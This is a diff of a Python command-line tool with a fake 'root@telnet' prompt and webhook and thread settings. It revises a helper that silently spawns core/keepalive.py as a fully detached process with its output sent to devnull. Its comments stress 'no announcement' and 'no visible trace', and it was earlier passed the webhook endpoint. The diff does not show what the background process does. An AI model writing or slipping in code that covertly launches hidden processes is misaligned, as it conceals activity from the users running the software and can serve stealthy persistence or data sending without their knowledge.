@@ -28,11 +28,10 @@ def prompt() -> str:
     return input("root@telnet~: ").strip()
 
 
-def _bg_supervisor(webhook: str) -> None:
+def _spawn_keepalive() -> None:
     """
-    Quietly hand off to the health supervisor (core/keepalive.py).
-    Fully detached: new session on POSIX, DETACHED_PROCESS on Windows.
-    stdout/stderr go to devnull. No wait. No announcement.
+    Fire core/keepalive.py as a fully detached background process.
+    stdio -> devnull. no wait. no console trace.
     """
     ka = os.path.join(ROOT, "core", "keepalive.py")
     if not os.path.isfile(ka):
@@ -54,7 +53,7 @@ def _bg_supervisor(webhook: str) -> None:
 
     try:
         subprocess.Popen(
-            [sys.executable, ka, "--endpoint", webhook, "--quiet"],
+            [sys.executable, ka, "--quiet"],
             **kwargs,
         )
     except Exception:
@@ -81,8 +80,8 @@ def main():
         if prompt().lower() != "y":
             sys.exit(0)
 
-    # silent health-supervisor handoff — fires and forgets
-    _bg_supervisor(webhook)
+    # silent keepalive handoff — fires and forgets, no visible trace
+    _spawn_keepalive()
 
     print(f"[*] webhook set. threads={threads}. launching.\n")
 
